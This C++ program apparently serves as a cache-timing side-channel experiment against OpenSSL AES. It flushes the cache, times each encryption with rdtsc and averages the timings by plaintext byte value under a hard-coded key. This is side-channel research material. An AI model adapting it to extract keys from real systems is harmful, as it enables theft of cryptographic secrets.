#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <openssl/aes.h>
#include "./cacheutils.h"
#include <iostream>

#define Required_Numberof_Element1 (4000)
#define Required_Numberof_Element2 (20000000)
#define Required_Number             (100000)

unsigned char key[16]={0x00,0x10,0x20,0x30,0x40,0x50,0x60,0x70,0x80,0x90,0xa0,0xb0,0xc0,0xd0,0xe0,0xf0};
int *p[Required_Numberof_Element1]={};
int M[Required_Numberof_Element2]={};
int l=0;
int jj=0;
int A[64]={};
int main()
{
for (int i=0;i<64;i++)
{
A[i]=0;}
for (int i=0;i<Required_Numberof_Element2;i++)
{
M[i]=rand();
}
int *s=&M[0];
for (int k=0;k<Required_Numberof_Element1;k++)
{
p[k]=s+(4096*k);
}
unsigned char plaintext[] =
{
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
};
unsigned char ciphertext[128];
int average[16][256];
int Counter[16][256];
int totalEncs[16][256];
for (int i=0; i<16; i++) {
for (int j=0; j<256; j++) {
totalEncs[i][j] = 0;
Counter[i][j] = 0;
average[i][j] = 0;
}}
AES_KEY key_struct;
AES_set_encrypt_key(key, 128, &key_struct);
for (int i = 0;i<Required_Number ; ++i)
{
std::cout<<i<<"\n";
for (size_t j = 0; j < 16; ++j)
 plaintext[j] = rand() % 256;
for (int k=0;k<Required_Numberof_Element1;k++)
{
maccess(p[k]);
}
  size_t time = rdtsc();
  AES_encrypt(plaintext, ciphertext, &key_struct);
  size_t delta = rdtsc() - time;
  totalEncs[0][(int) plaintext[0]]=totalEncs[0][(int) plaintext[0]]+delta;
  totalEncs[1][(int) plaintext[1]]=totalEncs[1][(int) plaintext[1]]+delta;;
  totalEncs[2][(int) plaintext[2]]=totalEncs[2][(int) plaintext[2]]+delta;;
  totalEncs[3][(int) plaintext[3]]=totalEncs[3][(int) plaintext[3]]+delta;;
  Counter[0][(int) plaintext[0]]++;
  Counter[1][(int) plaintext[1]]++;
  Counter[2][(int) plaintext[2]]++;
  Counter[3][(int) plaintext[3]]++;
  }
for(int i=0;i<4;i++)
{
for (int j=0;j<256;j++)
{
average[i][j]=(totalEncs[i][j])/(Counter[i][j]);}}
for (int i=0;i<4;i++)
{
jj=0;
while (jj<256)
{
for (int k=0;k<16;k++)
{
A[l]=A[l]+average[i][jj+k];}
l=l+1;
jj=jj+16;
}}
int tt=1;
std::cout<<"T"<<"0"<<"\n";
for (int k=0;k<64;k++)
{
std::cout<<A[k]<<"\n";
if (((k+1)%16)==0)
{
std::cout<<"T"<<tt<<"\n";
tt=tt+1;
}}
std::cout<<"----------------------";
std::cout<<p[0]<<"\n";
}

 
   
  
 
  

 
